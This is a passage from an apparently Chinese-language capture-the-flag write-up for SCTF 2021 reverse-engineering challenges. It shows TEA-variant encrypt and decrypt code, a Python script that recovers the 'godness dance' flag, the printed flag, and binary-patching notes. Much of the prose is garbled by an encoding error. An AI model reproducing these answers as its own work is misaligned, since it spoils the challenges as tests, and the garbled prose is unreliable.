</span></span><span class=line><span class=cl>                <span class=o>*</span><span class=p>(</span><span class=n>uint32_t</span><span class=o>*</span><span class=p>)(</span><span class=n>d_2ed8</span> <span class=o>+</span> <span class=n>i</span><span class=p>)</span> <span class=o>=</span> <span class=n>v</span><span class=p>[</span><span class=mi>0</span><span class=p>];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=o>*</span><span class=p>(</span><span class=n>uint32_t</span><span class=o>*</span><span class=p>)(</span><span class=n>d_2ed8</span> <span class=o>+</span> <span class=mi>4</span> <span class=o>+</span> <span class=n>i</span><span class=p>)</span> <span class=o>=</span> <span class=n>v</span><span class=p>[</span><span class=mi>1</span><span class=p>];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=p>(</span><span class=ne>int</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=mh>0x1000</span><span class=p>;</span> <span class=n>i</span> <span class=o>+=</span> <span class=mi>8</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=n>uint32_t</span> <span class=n>v</span><span class=p>[</span><span class=mi>2</span><span class=p>];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=n>uint32_t</span>  <span class=n>key</span><span class=p>[</span><span class=mi>4</span><span class=p>]</span> <span class=o>=</span> <span class=p>{</span> <span class=mh>0x11222233</span> <span class=p>,</span><span class=mh>0xAABBCCDD</span><span class=p>,</span> <span class=mh>0x1a2b3c4d</span><span class=p>,</span><span class=mh>0xcc1122aa</span> <span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=n>v</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=o>*</span><span class=p>(</span><span class=n>uint32_t</span><span class=o>*</span><span class=p>)(</span><span class=n>d_2ed0</span> <span class=o>+</span> <span class=n>i</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=n>v</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=o>*</span><span class=p>(</span><span class=n>uint32_t</span><span class=o>*</span><span class=p>)(</span><span class=n>d_2ed0</span> <span class=o>+</span> <span class=mi>4</span> <span class=o>+</span> <span class=n>i</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=n>encrypt1</span><span class=p>(</span><span class=n>v</span><span class=p>,</span> <span class=n>key</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=o>//</span>        <span class=n>printf</span><span class=p>(</span><span class=s2>&#34;v0 == </span><span class=si>%lx</span><span class=s2> v1== </span><span class=si>%lx</span><span class=s2>&#34;</span><span class=p>,</span><span class=n>v</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span><span class=n>v</span><span class=p>[</span><span class=mi>1</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=o>*</span><span class=p>(</span><span class=n>uint32_t</span><span class=o>*</span><span class=p>)(</span><span class=n>d_2ed0</span> <span class=o>+</span> <span class=n>i</span><span class=p>)</span> <span class=o>=</span> <span class=n>v</span><span class=p>[</span><span class=mi>0</span><span class=p>];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=o>*</span><span class=p>(</span><span class=n>uint32_t</span><span class=o>*</span><span class=p>)(</span><span class=n>d_2ed0</span> <span class=o>+</span> <span class=mi>4</span> <span class=o>+</span> <span class=n>i</span><span class=p>)</span> <span class=o>=</span> <span class=n>v</span><span class=p>[</span><span class=mi>1</span><span class=p>];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>exchange</span><span class=p>(</span><span class=n>index</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>bigexchange</span><span class=p>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>printf</span><span class=p>(</span><span class=s2>&#34;d_2ed8 = &#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=p>(</span><span class=ne>int</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=mi>16</span><span class=p>;</span> <span class=o>++</span><span class=n>i</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=n>printf</span><span class=p>(</span><span class=s2>&#34;</span><span class=si>%x</span><span class=s2> &#34;</span><span class=p>,</span><span class=n>d_2ed8</span><span class=p>[</span><span class=n>i</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>printf</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=p>(</span><span class=ne>int</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=mi>16</span><span class=p>;</span> <span class=o>++</span><span class=n>i</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=n>printf</span><span class=p>(</span><span class=s2>&#34;</span><span class=si>%x</span><span class=s2> &#34;</span><span class=p>,</span> <span class=n>d_2ed8</span><span class=p>[</span><span class=mh>0xf</span><span class=o>*</span><span class=mh>0x100</span> <span class=o>+</span><span class=n>i</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>printf</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2> d_2ed0= &#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=p>(</span><span class=ne>int</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=mi>16</span><span class=p>;</span> <span class=o>++</span><span class=n>i</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=n>printf</span><span class=p>(</span><span class=s2>&#34;</span><span class=si>%x</span><span class=s2> &#34;</span><span class=p>,</span> <span class=n>d_2ed0</span><span class=p>[</span><span class=n>i</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>printf</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=p>(</span><span class=ne>int</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=mi>16</span><span class=p>;</span> <span class=o>++</span><span class=n>i</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=n>printf</span><span class=p>(</span><span class=s2>&#34;</span><span class=si>%x</span><span class=s2> &#34;</span><span class=p>,</span> <span class=n>d_2ed0</span><span class=p>[</span><span class=mh>0xf</span> <span class=o>*</span> <span class=mh>0x100</span> <span class=o>+</span> <span class=n>i</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p><img src=/img/2021-12-25-SCTF/20211228082941976.jpg alt=img></p><p>æ¯”è¾ƒçš„æ•°åœ¨1ec8 ec8 ghidra æ‰“å¼€sctfçœ‹ä¸€ä¸‹å°±è¡Œ å‰é¢çš„ä»£ç æ˜¯å®ƒçš„åŠ å¯†æµç¨‹</p><h3 id=godness-dance>godness dance</h3><p>é€†å‘å‘ç°ï¼Œç¨‹åºè¾“å…¥ä¸€ä¸ªé•¿åº¦ 28 çš„å­—ç¬¦ä¸²ï¼Œå¦‚æœç¬¦åˆæ¡ä»¶ï¼Œå°±ä¼šåŒ…è£¹åˆ° <code>SCTF{}</code> å†…ç„¶åè¾“å‡ºã€‚å› æ­¤è¿™ä¸ªå­—ç¬¦ä¸²å°±æ˜¯ flag çš„æ ¸å¿ƒéƒ¨åˆ†ã€‚</p><p>é¦–å…ˆï¼Œç¨‹åºä¼šåšç¬¬ä¸€éƒ¨åˆ†çš„æ£€æŸ¥ï¼Œæ ¹æ®é€»è¾‘ï¼Œç»Ÿè®¡æ¯ä¸ªå­—ç¬¦å‡ºç°çš„æ¬¡æ•°ï¼Œç„¶åè·Ÿä¸€ä¸ªé¢„ç½®çš„åˆ—è¡¨è¿›è¡Œæ¯”è¾ƒï¼Œå¦‚æœå‘ç°ä¸ç›¸ç­‰ï¼Œå°±æ‰“å° â€œcount wrongâ€ã€‚å› æ­¤é€šè¿‡è¿™é‡Œå¯ä»¥å¾—åˆ°æ¯ä¸ªå­—ç¬¦å‡ºç°çš„æ¬¡æ•°åˆ—è¡¨ã€‚</p><p>å®é™…æƒ…å†µæ˜¯ï¼Œåªå…è®¸å°å†™å­—æ¯ï¼Œè€Œä¸”å¤§éƒ¨åˆ†å‡ºç°æ¬¡æ•°éƒ½æ˜¯ 1ï¼Œå°‘é‡å­—æ¯å¯ä»¥å‡ºç° 2 æ¬¡ã€‚</p><p>åˆ°è¿™ä¸€æ­¥ï¼Œæˆ‘ä»¬å¯ä»¥åˆ¤æ–­å‡º flag æ˜¯ <code>abcdefghiijklmnopqrstuuvwxyz</code> çš„æŸä¸ªæ’åˆ—ã€‚</p><p>æ¥ä¸‹æ¥ï¼Œæœ‰ä¸€ä¸ªå‡½æ•°æŠŠ flag ä¼ è¿›å»ï¼Œç„¶ååšäº†ä¸€ç³»åˆ—æ“ä½œç®—å‡ºæ¥ä¸€ä¸ªæ•°ç»„ï¼Œæœ€åè·Ÿä¸€ä¸ªé¢„ç½®çš„å…¨å±€æ•°ç»„è¿›è¡Œå¯¹æ¯”ï¼Œåªæœ‰å®Œå…¨ç›¸ç­‰æ‰èƒ½é€šè¿‡ã€‚å› æ­¤ä¸»è¦æ˜¯é€†å‘è¿™ä¸ªå‡½æ•°ã€‚</p><p>è¿™ä¸ªå‡½æ•°ä¸­é—´æœ‰ä¸€å¤§å¨ä»£ç æ˜¯è®©äººä¸å¤ªæƒ³çœ‹çš„ï¼Œä½†æ˜¯å¥½åœ¨ä¸€çœ¼çœ‹è¿‡å»ï¼Œåªæœ‰ä¸€äº› shuffle ç›¸å…³å’Œç»Ÿè®¡ç›¸å…³çš„éƒ¨åˆ†ï¼Œæ²¡æœ‰ç‰¹åˆ«å¤æ‚çš„é€»è¾‘å‡ºç°ã€‚æ­¤å¤–ï¼Œè§‚å¯Ÿåˆ°æœ€ç»ˆçš„ check æ•°ç»„æ˜¯ä» 0-28 çš„ä¸€ä¸ªæ’åˆ—ï¼Œå› æ­¤çŒœæµ‹åªæ˜¯åœ¨è¡¨è¾¾æ¯ä¸ªå­—ç¬¦çš„å¯¹åº”ä½ç½®ã€‚</p><p>é€šè¿‡ gdb å°è¯•æ¥è¾“å…¥å‡ ä¸ªæµ‹è¯•ä¾‹å­ï¼Œå°è¯•æ¢ä¸€æ¢å­—æ¯çš„é¡ºåºæ›´åŠ å°è¯äº†è¿™ä¸€ç‚¹ã€‚</p><p>äºæ˜¯å°è¯•å†™ä¸€æ®µä»£ç æ¥æ¢å¤:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Prolog data-lang=Prolog><span class=line><span class=cl><span class=s>charset</span> <span class=o>=</span> <span class=s>b&#39;abcdefghiijklmnopqrstuuvwxyz&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=s>seq</span> <span class=o>=</span> <span class=p>[</span><span class=mh>0x2</span><span class=p>,</span> <span class=mh>0x1A</span><span class=p>,</span> <span class=mh>0x11</span><span class=p>,</span> <span class=mh>0x1C</span><span class=p>,</span> <span class=mh>0x18</span><span class=p>,</span> <span class=mh>0x0B</span><span class=p>,</span> <span class=mh>0x15</span><span class=p>,</span> <span class=mh>0x0A</span><span class=p>,</span> <span class=mh>0x10</span><span class=p>,</span> <span class=mh>0x14</span><span class=p>,</span> <span class=mh>0x13</span><span class=p>,</span> <span class=mh>0x12</span><span class=p>,</span> <span class=mh>0x3</span><span class=p>,</span> <span class=mh>0x8</span><span class=p>,</span> <span class=mh>0x6</span><span class=p>,</span> <span class=mh>0x0C</span><span class=p>,</span> <span class=mh>0x9</span><span class=p>,</span> <span class=mh>0x0E</span><span class=p>,</span> <span class=mh>0x0D</span><span class=p>,</span> <span class=mh>0x16</span><span class=p>,</span> <span class=mh>0x4</span><span class=p>,</span> <span class=mh>0x1B</span><span class=p>,</span> <span class=mh>0x0F</span><span class=p>,</span> <span class=mh>0x17</span><span class=p>,</span> <span class=mh>0x1</span><span class=p>,</span> <span class=mh>0x19</span><span class=p>,</span> <span class=mh>0x7</span><span class=p>,</span> <span class=mh>0x5</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=s>flag</span> <span class=o>=</span> <span class=p>[</span><span class=nv>None</span><span class=p>]</span> <span class=o>*</span> <span class=mi>29</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=s>for</span> <span class=s>i</span><span class=p>,</span> <span class=s>e</span> <span class=s>in</span> <span class=nf>enumerate</span><span class=p>(</span><span class=s>seq</span><span class=p>)</span><span class=s>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=s>flag</span><span class=p>[</span><span class=s>e</span><span class=p>]</span> <span class=o>=</span> <span class=s>charset</span><span class=p>[</span><span class=s>i</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nf>print</span><span class=p>(</span><span class=nf>bytes</span><span class=p>(</span><span class=s>flag</span><span class=p>[</span><span class=mi>1</span><span class=s>:</span><span class=p>]))</span>
</span></span><span class=line><span class=cl><span class=err>$</span> <span class=p>.</span><span class=o>/</span><span class=s>dance</span><span class=p>.</span><span class=s>out</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>Input</span><span class=s>:waltznymphforquickjigsvexbud</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>Good</span> <span class=s>for</span> <span class=s>you</span><span class=p>!</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nn>flag</span><span class=p>:</span><span class=nv>SCTF</span><span class=p>{</span><span class=s>waltznymphforquickjigsvexbud</span><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=cplusexceptionencrypt><strong>CplusExceptionEncrypt</strong></h3><p>æè¿°ï¼šcpp is a good language</p><p>ä½¿ç”¨sshç©¿èµ·æ¥çš„é€»è¾‘ï¼Œå¯ä»¥è¿™æ ·å°†ä»–å¤„ç†</p><p><img src=/img/2021-12-25-SCTF/20211228082942213.jpg alt=img></p><p><img src=/img/2021-12-25-SCTF/20211228082942283.jpg alt=img></p><p>è®¡ç®— 0x402c37-0x402730=0x507</p><p>ç„¶åæŠŠthrowæ”¹æˆ jmp 0x572</p><p>jmp 0x502</p><p>å°±è¡Œäº†</p><p>å¯èƒ½è¿˜è¦ç®€å•æ ¹æ®ç»“æ„ä½“ç¡®è®¤ä¸€ä¸‹è·³è½¬</p><p>åˆ†æäº†ä¸€ä¸‹å¤§éƒ¨åˆ†çš„æ“ä½œéƒ½ç”¨sehæ¡†èµ·æ¥ï¼Œç›®æµ‹æ˜¯xxtea</p><p>é­”æ”¹çš„tea+ç¨å¾®æ­£å¸¸çš„aesï¼ˆä¹Ÿé­”æ”¹äº†ï¼‰</p><p>teaéƒ¨åˆ†</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=kt>void</span> <span class=nf>encrypt</span> <span class=p>(</span><span class=kt>uint32_t</span><span class=o>*</span> <span class=n>v</span><span class=p>,</span> <span class=kt>uint32_t</span><span class=o>*</span> <span class=n>k</span><span class=p>)</span> <span class=p>{</span>  
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kt>uint32_t</span> <span class=n>v0</span><span class=o>=</span><span class=n>v</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=n>v1</span><span class=o>=</span><span class=n>v</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=n>v2</span><span class=o>=</span><span class=n>v</span><span class=p>[</span><span class=mi>2</span><span class=p>],</span> <span class=n>v3</span><span class=o>=</span><span class=n>v</span><span class=p>[</span><span class=mi>3</span><span class=p>];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kt>uint32_t</span> <span class=n>sum1</span><span class=o>=</span><span class=mi>0</span><span class=p>,</span><span class=n>sum2</span><span class=o>=</span><span class=mi>0</span><span class=p>,</span> <span class=n>i</span><span class=p>;</span>           <span class=cm>/* set up */</span>  
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kt>uint32_t</span> <span class=n>delta</span><span class=o>=</span><span class=mh>0x73637466</span><span class=p>;</span>                     <span class=cm>/* a key schedule constant */</span>  
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kt>uint32_t</span> <span class=n>k0</span><span class=o>=</span><span class=n>k</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=n>k1</span><span class=o>=</span><span class=n>k</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=n>k2</span><span class=o>=</span><span class=n>k</span><span class=p>[</span><span class=mi>2</span><span class=p>],</span> <span class=n>k3</span><span class=o>=</span><span class=n>k</span><span class=p>[</span><span class=mi>3</span><span class=p>];</span>   <span class=cm>/* cache key */</span>  
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=p>(</span><span class=n>i</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=mi>32</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>                       <span class=cm>/* basic cycle start */</span>  
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>sum1</span> <span class=o>+=</span> <span class=n>delta</span><span class=p>;</span>  
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>sum2</span> <span class=o>+=</span> <span class=n>delta</span><span class=p>;</span>  
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>v0</span> <span class=o>+=</span> <span class=p>((</span><span class=n>v1</span><span class=o>&lt;&lt;</span><span class=mi>4</span><span class=p>)</span> <span class=o>+</span> <span class=n>k2</span><span class=p>)</span> <span class=o>^</span> <span class=p>(</span><span class=n>sum1</span> <span class=o>+</span> <span class=n>v1</span><span class=p>)</span> <span class=o>^</span> <span class=p>((</span><span class=n>v1</span><span class=o>&gt;&gt;</span><span class=mi>5</span><span class=p>)</span> <span class=o>+</span> <span class=n>k3</span><span class=p>)</span> <span class=o>^</span> <span class=p>(</span><span class=n>sum1</span> <span class=o>+</span> <span class=n>i</span><span class=p>);</span>  
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>v2</span> <span class=o>+=</span> <span class=p>((</span><span class=n>v3</span><span class=o>&lt;&lt;</span><span class=mi>4</span><span class=p>)</span> <span class=o>+</span> <span class=n>k2</span><span class=p>)</span> <span class=o>^</span> <span class=p>(</span><span class=n>sum2</span> <span class=o>+</span> <span class=n>v3</span><span class=p>)</span> <span class=o>^</span> <span class=p>((</span><span class=n>v3</span><span class=o>&gt;&gt;</span><span class=mi>5</span><span class=p>)</span> <span class=o>+</span> <span class=n>k3</span><span class=p>)</span> <span class=o>^</span> <span class=p>(</span><span class=n>sum2</span> <span class=o>+</span> <span class=n>i</span><span class=p>);</span>  
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>v1</span> <span class=o>+=</span> <span class=p>((</span><span class=n>v0</span><span class=o>&lt;&lt;</span><span class=mi>4</span><span class=p>)</span> <span class=o>+</span> <span class=n>k0</span><span class=p>)</span> <span class=o>^</span> <span class=p>(</span><span class=n>sum1</span> <span class=o>+</span> <span class=n>v0</span><span class=p>)</span> <span class=o>^</span> <span class=p>((</span><span class=n>v0</span><span class=o>&gt;&gt;</span><span class=mi>5</span><span class=p>)</span> <span class=o>+</span> <span class=n>k1</span><span class=p>)</span> <span class=o>^</span> <span class=p>(</span><span class=n>sum1</span> <span class=o>+</span> <span class=n>i</span><span class=p>);</span>  
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>v3</span> <span class=o>+=</span> <span class=p>((</span><span class=n>v2</span><span class=o>&lt;&lt;</span><span class=mi>4</span><span class=p>)</span> <span class=o>+</span> <span class=n>k0</span><span class=p>)</span> <span class=o>^</span> <span class=p>(</span><span class=n>sum2</span> <span class=o>+</span> <span class=n>v2</span><span class=p>)</span> <span class=o>^</span> <span class=p>((</span><span class=n>v2</span><span class=o>&gt;&gt;</span><span class=mi>5</span><span class=p>)</span> <span class=o>+</span> <span class=n>k1</span><span class=p>)</span> <span class=o>^</span> <span class=p>(</span><span class=n>sum2</span> <span class=o>+</span> <span class=n>i</span><span class=p>);</span>  
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1>// v1 += ((v0&lt;&lt;4) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;5) + k3);  
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>                                              <span class=cm>/* end cycle */</span>  
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>v</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span><span class=o>=</span><span class=n>v0</span> <span class=o>^</span> <span class=p>((</span><span class=n>delta</span><span class=o>&gt;&gt;</span><span class=mi>24</span><span class=p>)</span><span class=o>&amp;</span><span class=mh>0xff</span><span class=p>);</span> <span class=n>v</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span><span class=o>=</span><span class=n>v1</span><span class=o>^</span> <span class=p>((</span><span class=n>delta</span><span class=o>&gt;&gt;</span><span class=mi>16</span><span class=p>)</span><span class=o>&amp;</span><span class=mh>0xff</span><span class=p>);</span>  
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>v</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span><span class=o>=</span><span class=n>v2</span><span class=o>^</span> <span class=p>((</span><span class=n>delta</span><span class=o>&gt;&gt;</span><span class=mi>8</span><span class=p>)</span><span class=o>&amp;</span><span class=mh>0xff</span><span class=p>);</span> <span class=n>v</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span><span class=o>=</span><span class=n>v3</span> <span class=o>^</span> <span class=p>((</span><span class=n>delta</span><span class=p>)</span><span class=o>&amp;</span><span class=mh>0xff</span><span class=p>);</span>  
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>}</span>  
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>//è§£å¯†å‡½æ•°  
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>decrypt</span> <span class=p>(</span><span class=kt>uint32_t</span><span class=o>*</span> <span class=n>v</span><span class=p>,</span> <span class=kt>uint32_t</span><span class=o>*</span> <span class=n>k</span><span class=p>)</span> <span class=p>{</span>  
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kt>uint32_t</span> <span class=n>v0</span><span class=o>=</span><span class=n>v</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=n>v1</span><span class=o>=</span><span class=n>v</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=n>v2</span><span class=o>=</span><span class=n>v</span><span class=p>[</span><span class=mi>2</span><span class=p>],</span> <span class=n>v3</span><span class=o>=</span><span class=n>v</span><span class=p>[</span><span class=mi>3</span><span class=p>];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kt>uint32_t</span> <span class=n>sum1</span><span class=o>=</span><span class=mh>0x6c6e8cc0</span><span class=p>,</span><span class=n>sum2</span><span class=o>=</span><span class=mh>0x6c6e8cc0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>i</span><span class=p>;</span>  <span class=cm>/* set up */</span>  
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kt>uint32_t</span> <span class=n>delta</span><span class=o>=</span><span class=mh>0x73637466</span><span class=p>;</span>                     <span class=cm>/* a key schedule constant */</span>  
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kt>uint32_t</span> <span class=n>k0</span><span class=o>=</span><span class=n>k</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=n>k1</span><span class=o>=</span><span class=n>k</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=n>k2</span><span class=o>=</span><span class=n>k</span><span class=p>[</span><span class=mi>2</span><span class=p>],</span> <span class=n>k3</span><span class=o>=</span><span class=n>k</span><span class=p>[</span><span class=mi>3</span><span class=p>];</span>   <span class=cm>/* cache key */</span>  
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>v0</span><span class=o>=</span><span class=n>v0</span> <span class=o>^</span> <span class=p>((</span><span class=n>delta</span><span class=o>&gt;&gt;</span><span class=mi>24</span><span class=p>)</span><span class=o>&amp;</span><span class=mh>0xff</span><span class=p>);</span> <span class=n>v1</span><span class=o>=</span><span class=n>v1</span><span class=o>^</span> <span class=p>((</span><span class=n>delta</span><span class=o>&gt;&gt;</span><span class=mi>16</span><span class=p>)</span><span class=o>&amp;</span><span class=mh>0xff</span><span class=p>);</span>  
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>v2</span><span class=o>=</span><span class=n>v2</span><span class=o>^</span> <span class=p>((</span><span class=n>delta</span><span class=o>&gt;&gt;</span><span class=mi>8</span><span class=p>)</span><span class=o>&amp;</span><span class=mh>0xff</span><span class=p>);</span> <span class=n>v3</span><span class=o>=</span><span class=n>v3</span> <span class=o>^</span> <span class=p>((</span><span class=n>delta</span><span class=p>)</span><span class=o>&amp;</span><span class=mh>0xff</span><span class=p>);</span> 
</span></span><span class=line><span class=cl>
